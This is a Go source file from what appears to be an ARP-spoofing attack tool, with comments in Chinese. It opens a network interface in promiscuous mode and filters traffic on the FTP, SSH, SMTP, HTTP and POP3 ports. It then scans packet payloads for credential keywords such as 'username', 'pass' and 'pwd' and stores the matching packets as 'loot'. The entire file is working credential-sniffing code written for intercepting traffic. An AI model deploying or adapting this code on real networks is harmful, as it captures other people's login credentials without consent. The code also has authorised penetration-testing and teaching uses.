package logic

import (
	"bytes"
	"context"
	"fmt"
	"log"
	"strings"

	"github.com/ShangRui-hash/arp-spoofing-go/dao/memory"
	"github.com/ShangRui-hash/arp-spoofing-go/debug"
	"github.com/ShangRui-hash/arp-spoofing-go/models"
	"github.com/ShangRui-hash/arp-spoofing-go/pkg/routine"
	"github.com/ShangRui-hash/arp-spoofing-go/settings"
	"github.com/ShangRui-hash/arp-spoofing-go/vars"

	"github.com/google/gopacket"
	"github.com/google/gopacket/layers"
	"github.com/google/gopacket/pcap"
)

//Sniff 嗅探
func Sniff() error {
	ifname, err := settings.Options.Get("ifname")
	if err != nil {
		log.Println(err)
		return err
	}
	//1.设置网卡为混杂模式并监听
	handle, err := pcap.OpenLive(ifname, 65535, true, pcap.BlockForever)
	if err != nil {
		log.Printf("OpenLive Error:%v", err)
		return err
	}
	// defer handle.Close() //不能关，子协程还要用
	//2.设置过滤器
	ports := []int{21, 22, 25, 80, 110}
	filters := make([]string, 0, len(ports))
	for _, port := range ports {
		filters = append(filters, fmt.Sprintf("(tcp and dst port %d)", port))
	}
	filter := strings.Join(filters, " or ")
	debug.Println(filter)
	err = handle.SetBPFFilter(filter)
	if err != nil {
		log.Println("handle.SetBPFFilter failed,err:", err)
		return err
	}
	//4.获取敏感信息并存储到数据库中
	ctx, cancel := context.WithCancel(context.Background())
	vars.SniffCancelFunc = cancel
	go func(ctx context.Context) {
		debug.Println("启动了一个存储敏感报文的协程:", routine.GetGID())
		defer func() {
			debug.Println("敏感报文存储器退出:", routine.GetGID())
		}()
		for loot := range DigPacket(ctx, handle) {
			//1.检查上级是否通知退出
			select {
			case <-ctx.Done():
				return
			default:
			}
			//2.开始工作
			// err := redis.NewLootsSaver().Add(loot)
			// if err != nil {
			// 	log.Println("redis.NewLootSaver add loot failed,err:", err)
			// 	return
			// }
			memory.AddLoot(loot)
		}
	}(ctx)

	return nil
}

//DigPacket 从报文中挖掘敏感信息
func DigPacket(ctx context.Context, handle *pcap.Handle) <-chan *models.Loot {
	outCh := make(chan *models.Loot, 10240)
	go func() {
		debug.Println("启动了一个嗅探敏感信息的协程:", routine.GetGID())
		defer func() {
			debug.Println("嗅探敏感信息的协程退出:", routine.GetGID())
			vars.SniffCancelFunc = nil
		}()
		//3.创建数据源
		src := gopacket.NewPacketSource(handle, handle.LinkType())
		for packet := range src.Packets() {
			//4.1解析IP层获取 srcIP 和 dstIP
			ipLayer := packet.Layer(layers.LayerTypeIPv4)
			if ipLayer == nil {
				continue
			}
			ip := ipLayer.(*layers.IPv4)
			srcIP := ip.SrcIP.String()
			dstIP := ip.DstIP.String()
			//4.2 解析TCP层 获取 srcPort 和 dstPort
			tcpLayer := packet.Layer(layers.LayerTypeTCP)
			if tcpLayer == nil {
				debug.Println("packet.Layer(layers.LayerTypeTCP) is null")
				continue
			}
			tcp := tcpLayer.(*layers.TCP)
			srcPort := tcp.SrcPort.String()
			dstPort := tcp.DstPort.String()
			//4.3 解析应用层 嗅探是否有用户名和密码
			application := packet.ApplicationLayer()
			if application == nil {
				continue
			}
			payload := application.Payload()
			log.Println(string(payload))
			exist, keyword := checkKeyword(payload)
			if !exist {
				continue
			}
			//4.4 输出敏感信息
			outCh <- &models.Loot{
				SrcIP:   srcIP,
				DstIP:   dstIP,
				SrcPort: srcPort,
				DstPort: dstPort,
				Keyword: keyword,
				Payload: string(payload),
			}
			//0 检查父协程是否通知结束工作
			select {
			case <-ctx.Done():
				debug.Println("上级通知退出")
				return
			default:
			}
		}
	}()
	return outCh
}

//checkKeyword 检查payload中是否含有关键字
func checkKeyword(payload []byte) (bool, string) {
	keywords := []string{"username", "uname", "u_name", "user_name", "usr", "login", "manager", "name", "admin", "pass", "pwd"}
	//不能嗅探user，因为user-agent 几乎每个http报文中都有
	//1.将payloads 转化为小写
	payload = bytes.ToLower(payload)
	//2.比对是否有关键字
	for i := range keywords {
		if bytes.Contains(payload, []byte(keywords[i])) {
			return true, keywords[i]
		}
	}
	return false, ""
}
